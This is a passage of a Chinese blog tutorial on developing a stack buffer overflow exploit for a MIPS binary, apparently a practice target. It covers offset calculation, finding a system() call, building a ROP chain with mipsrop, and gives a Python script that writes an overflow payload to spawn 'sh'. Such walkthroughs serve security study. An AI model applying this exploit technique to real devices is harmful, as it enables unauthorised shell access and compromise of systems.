+<h2 id="漏洞exploit利用开发"><a href="#漏洞exploit利用开发" class="headerlink" title="漏洞exploit利用开发"></a>漏洞exploit利用开发</h2><p>完整漏洞利用开发过程应该是如下的步骤：<br>1、计算局部变量到 返回地址的偏移，也就是buf 到$ra的偏移，劫持PC；<br>2、寻找可利用的攻击方式和途径<br>3、构造ROP Chain<br>4、编写漏洞利用程序</p>
+<h3 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h3><p>首先是确定buf 到$ra的偏移<br>这里介绍两种方法来进行计算<br><strong>1、栈帧分析</strong><br>通过静态分析，首先F5 看程序的伪代码，需要确定buf 离栈帧的地址，如下图所示，buf 会和adminpwd 进行比较，因此根据mips种函数调用参数的特性，可以定位到$a0，最终可以定位到 0x1C8+var_198，其中0x1C8 是栈帧的地址。</p>
+<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image5.png" alt="image-20231217162032481"></p>
+<p>下面确定buf 的偏移为-0x198 (这里的偏移都是相对栈帧fp), 并且也确定了$ra 的偏移为0x4。</p>
+<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image6.png" alt="image-20231217162032481"></p>
+<p>如果需要使缓冲区溢出，控制堆栈的返回地址$ra，需要覆盖的数据大小应该达到 0x4-(-0x198) &#x3D; 0x19c 字节</p>
+<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image7.png" alt="image-20231217162032481"></p>
+<p>确定了布局变量buf到返回的地址大小后，来验证是否正确<br> python -c “print ‘A’*0x19C + ‘BBBB’+’CCCC’” &gt; passwd<br> 如图所示，PC寄存器可以读入BBBB</p>
+<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image8.png" alt="image-20231217162032481"></p>
+<p><strong>2、使用脚本工具</strong><br>脚本自取：【<a target="_blank" rel="noopener" href="https://github.com/desword/shellcode_tools/blob/master/patternLocOffset.py%E3%80%91">https://github.com/desword/shellcode_tools/blob/master/patternLocOffset.py】</a><br>使用脚本字符来将生成字符串存储到 passwd 中</p>
+<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image9.png" alt="image-20231217162032481"></p>
+<p>使用IDA 进行远程调试，可以看到在$ra地址处是 0x6E37416E</p>
+<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image10.png" alt="image-20231217162032481"></p>
+<p>使用脚本计算偏移为412，和上面栈帧分析的一样。</p>
+<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image11.png" alt="image-20231217162032481"></p>
+<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/t01ee5255112c6ddeb3.png" alt="image-20231217162032481"></p>
+<h3 id="寻找可利用的攻击途径"><a href="#寻找可利用的攻击途径" class="headerlink" title="寻找可利用的攻击途径"></a>寻找可利用的攻击途径</h3><p>通过对文件的静态分析，不难发现程序中调用了do_system_0 函数，这个函数会调用system()函数来执行第二个参数，因此只需要将要执行的命令传入do_system_0函数的第二个参数$a1 中即可。</p>
+<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image12.png" alt="image-20231217162032481"></p>
+<h3 id="构造ROP-chain"><a href="#构造ROP-chain" class="headerlink" title="构造ROP chain"></a>构造ROP chain</h3><p>这里需要用到IDA脚本插件mipsrop.py<br><strong>1、安装mipsrop.py</strong><br>下载，完了放到ida的plugins目录就行，重启IDA。<br>【<a target="_blank" rel="noopener" href="https://github.com/devttys0/ida/blob/master/plugins/mipsrop/mipsrop.py%E3%80%91">https://github.com/devttys0/ida/blob/master/plugins/mipsrop/mipsrop.py】</a><br>2、打开你的mips程序，点击search——&gt;mips rop gadgets 。</p>
+<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image13.png" alt="image-20231217162032481"></p>
+<p>3、输入“ mipsrop.stackfinder() ”查找可用的godget</p>
+<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image14.png" alt="image-20231217162032481"></p>
+<p>4、双击0x00403810 可以看到这里，下面红色框中的代码我们可以用来构造rop chain。<br>为什么这段代码可以使用，是因为我们上面分析过，需要给do_system_0 函数 $a1 传递我们要执行的命令，恰好0x00403810此处将$sp+0x54+var_30内存中值赋值给$a1，只需要将要执行的命令放在$sp+0x54+var_30处，另外我们要调用do_system_0函数，下面0x00403814处 将$sp+0x54+var_s0的值加载到$ra 寄存中，后面会执行” jr $ra”, 让程序跳转到do_system_0继续执行。</p>
+<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image15.png" alt="image-20231217162032481"></p>
+<p>6、最终构造的ROP chain 如下图所示</p>
+<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image-20231217163711370.png" alt="image-20231217163711370"></p>
+<h3 id="编写漏洞利用程序"><a href="#编写漏洞利用程序" class="headerlink" title="编写漏洞利用程序"></a>编写漏洞利用程序</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Explainimport <span class="keyword">struct</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] prepare shellcode&quot;</span>)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;sh&quot;</span></span><br><span class="line">cmd += <span class="string">&quot;\00&quot;</span>*(<span class="number">4</span>-(<span class="built_in">len</span>(cmd) %<span class="number">4</span>))  # 栈对齐</span><br><span class="line">shellcode = <span class="string">&quot;A&quot;</span>*<span class="number">0x19C</span></span><br><span class="line">shellcode += <span class="keyword">struct</span>.pack(<span class="string">&quot;&gt;L&quot;</span>,<span class="number">0x00403810</span>)</span><br><span class="line">shellcode += <span class="string">&quot;A&quot;</span>*<span class="number">24</span></span><br><span class="line">shellcode += cmd</span><br><span class="line">shellcode += <span class="string">&quot;B&quot;</span>*(<span class="number">0x3C</span> - <span class="built_in">len</span>(cmd))</span><br><span class="line">shellcode += <span class="keyword">struct</span>.pack(<span class="string">&quot;&gt;L&quot;</span>, <span class="number">0x00400680</span>)</span><br><span class="line">shellcode += <span class="string">&quot;BBBB&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;OK!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] create password file&quot;</span>)</span><br><span class="line">fw = open(<span class="string">&#x27;passwd&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">fw.write(shellcode)</span><br><span class="line">fw.<span class="built_in">close</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ok&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="执行exploit"><a href="#执行exploit" class="headerlink" title="执行exploit"></a>执行exploit</h2><p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image17.png" alt="image-20231217162032481"></p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 jaytp@qq.com </span>
+    </div>
+</article>
+
+
+<p>
+    <a  class="dashang" onclick="dashangToggle()">💰</a>
+</p>
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2016-2020 Yelog
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+<div class="hide_box" onclick="dashangToggle()"></div>
+<div class="shang_box">
+    <a class="shang_close"  onclick="dashangToggle()">×</a>
+    <div class="shang_tit">
+        <p>Help us with donation</p>
+    </div>
+    <div class="shang_payimg">
+        <div class="pay_img">
+            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
+            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
+        </div>
+    </div>
+    <div class="shang_payselect">
+        <span><label><input type="radio" name="pay" checked value="alipay">alipay</label></span><span><label><input type="radio" name="pay" value="weixin">weixin</label></span>
+    </div>
+</div>
+
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+        $("input[name=pay]").on("click", function () {
+            if($("input[name=pay]:checked").val()=="weixin"){
+                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
+            } else {
+                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
+            }
+        })
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+    function dashangToggle() {
+        $(".shang_box").fadeToggle();
+        $(".hide_box").fadeToggle();
+    }
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
